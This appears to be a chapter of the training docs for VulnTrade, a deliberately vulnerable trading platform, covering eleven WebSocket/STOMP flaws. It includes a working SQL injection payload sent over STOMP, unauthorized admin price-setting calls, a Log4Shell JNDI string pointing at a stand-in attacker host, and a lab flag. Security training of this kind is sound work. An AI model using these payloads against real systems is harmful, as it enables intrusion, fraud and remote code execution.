# 05 — WebSocket & STOMP Vulnerabilities

## Overview
VulnTrade uses STOMP-over-WebSocket for real-time trading. This is a genuinely underserved area in security training — WAFs don't inspect WebSocket frames, automated scanners have limited WS support, and most pentesters have never practiced SQL injection over STOMP. This section covers the full WebSocket attack surface.

---

## Architecture

```
Browser (STOMP.js client)
    │
    │  ws://host:8085/ws
    │  STOMP CONNECT frame with Authorization header
    │
    ├── SUBSCRIBE /topic/prices         (broadcast price feed)
    ├── SUBSCRIBE /topic/admin/alerts   (admin-only... or is it?)
    ├── SUBSCRIBE /user/queue/orders    (personal order updates)
    ├── SUBSCRIBE /user/queue/history   (trade history response)
    │
    ├── SEND /app/trade.placeOrder      (place orders)
    ├── SEND /app/trade.getHistory      (fetch history — SQLi!)
    ├── SEND /app/admin.setPrice        (price manipulation!)
    └── SEND /app/admin.adjustBalance   (balance manipulation!)
```

---

## Vulnerabilities

### WS-01: SQL Injection via STOMP (Trade History)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | STOMP `/app/trade.getHistory` |
| File | `CustomQueryRepository.java:25-45` |

**Description:** Three injectable parameters (`startDate`, `endDate`, `symbol`) are concatenated into raw SQL. The response is sent back via `/user/queue/history`. Error messages leak database structure via `/user/queue/errors`.

**Why WAFs miss this:** WebSocket frames use binary framing after the HTTP upgrade handshake. STOMP message bodies (JSON) are inside WebSocket frames. Most WAFs only inspect HTTP request/response.

**How to exploit (Browser UI):**
1. Navigate to History page
2. In Symbol field: `' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --`
3. Click "Load via WebSocket"

**How to exploit (CLI with wscat):**
```bash
wscat -c ws://localhost:8085/ws
# CONNECT frame, then:
SEND
destination:/app/trade.getHistory
content-type:application/json

{"startDate":"2020-01-01","endDate":"2030-12-31","symbol":"' UNION SELECT 1,flag_value,3,4,now() FROM flags --"}
^@
```

See [../websocket-sqli-guide.md](../websocket-sqli-guide.md) for comprehensive payloads.

---

### WS-02: Admin Price Override — No Authorization
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A01: Broken Access Control |
| CWE | CWE-862 |
| Difficulty | Intermediate |
| Endpoint | STOMP `/app/admin.setPrice` |
| File | `AdminStompController.java:142-163` |

**Description:** The `setPrice` handler has NO role check. Any authenticated user can set any symbol to any price. The `StompChannelInterceptor` logs a warning for non-admin senders but does not block the message.

**How to exploit:**
```javascript
// In browser console (WebSocket already connected):
sendMessage('/app/admin.setPrice', { symbol: 'VULN', price: 99999 });
```

---

### WS-03: Admin Balance Adjustment — No Authorization
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A01: Broken Access Control |
| CWE | CWE-862 |
| Difficulty | Intermediate |
| Endpoint | STOMP `/app/admin.adjustBalance` |
| File | `AdminStompController.java` |

**Description:** Same as WS-02 — any user can adjust any user's balance. Give yourself unlimited money or drain other accounts.

---

### WS-04: Admin Channel Subscribable by All Users
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A01: Broken Access Control |
| CWE | CWE-862 |
| Difficulty | Intermediate |
| Endpoint | STOMP `SUBSCRIBE /topic/admin/alerts` |
| File | `StompChannelInterceptor.java:82-91` |

**Description:** Any authenticated user can subscribe to admin broadcast channels. These channels leak FLAG_7, admin actions, balance adjustments, and trading halt notifications.

---

### WS-05: Anonymous WebSocket Connection Allowed
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A07: Identification and Authentication Failures |
| CWE | CWE-306 |
| Difficulty | Intermediate |
| File | `StompChannelInterceptor.java:76-79` |

**Description:** If no JWT is provided in the STOMP CONNECT frame, the connection is allowed with an "anonymous" principal. Anonymous users can subscribe to broadcast topics like `/topic/prices`.

---

### WS-06: Token in STOMP Headers (Visible in Network Tab)
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A07: Identification and Authentication Failures |
| CWE | CWE-522 |
| File | `websocketService.js:23` |

**Description:** The JWT token is sent as a plain STOMP header in the CONNECT frame. It's visible in browser DevTools > Network > WS tab to anyone with access to the browser.

---

### WS-07: No WebSocket Origin Validation
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A01: Broken Access Control |
| CWE | CWE-346 |
| File | `WebSocketConfig.java:38` |

**Description:** `setAllowedOriginPatterns("*")` permits WebSocket connections from any origin. A malicious page on any domain can establish a WebSocket connection to VulnTrade if the user has a valid session.

---

### WS-08: No Message Rate Limiting
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A04: Insecure Design |
| CWE | CWE-799 |
| File | `WebSocketConfig.java:49` |

**Description:** No limit on STOMP messages per second. An attacker can flood the server with order placement requests, price override commands, or history queries.

---

### WS-09: No Message Size Limit
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A04: Insecure Design |
| CWE | CWE-400 |
| File | `WebSocketConfig.java:54` |

**Description:** WebSocket transport has no message size restriction configured, enabling DoS via oversized payloads.

---

### WS-10: Trading Halt Bypass
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A01: Broken Access Control |
| CWE | CWE-862 |
| Endpoint | STOMP `/app/admin.haltTrading`, `/app/admin.resumeTrading` |

**Description:** Any user can halt and resume trading for any symbol. During a halt, they can accumulate orders, then resume trading to execute them.

---

### WS-11: Log4Shell (CVE-2021-44228) via STOMP Messages
| Field | Value |
|-------|-------|
| Severity | Critical (CVSS 10.0) |
| OWASP | A03: Injection + A06: Vulnerable Components |
| CWE | CWE-917 |
| CVE | CVE-2021-44228 |
| Difficulty | Advanced |
| Endpoints | `/app/admin.haltTrading` (reason), `/app/admin.adjustBalance` (reason), `/app/trade.setAlert` (symbol) |
| Files | `AdminService.java:97,73`, `AlertService.java:53` |

**Description:** The backend uses Log4j2 2.14.1 and logs user-controlled input from STOMP messages without sanitization. Injecting `${jndi:ldap://attacker/Exploit}` in the `reason` field of halt/balance operations triggers JNDI lookup resolution → remote class loading → RCE.

**Why WebSocket makes this worse:** WAFs inspect HTTP traffic but cannot see inside STOMP frames. Log4Shell payloads delivered via WebSocket bypass every network-level defense.

**Quickest trigger:**
```javascript
sendMessage('/app/admin.haltTrading', {
  symbol: 'AAPL',
  reason: '${jndi:ldap://attacker.com:1389/Exploit}'
});
```

**Flag:** `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}` — read `/opt/flags/flag_log4shell.txt` after achieving RCE.

See [03-injection.md#inj-11](03-injection.md#inj-11-log4shell-cve-2021-44228-via-websocket) for the full exploitation walkthrough with marshalsec setup.
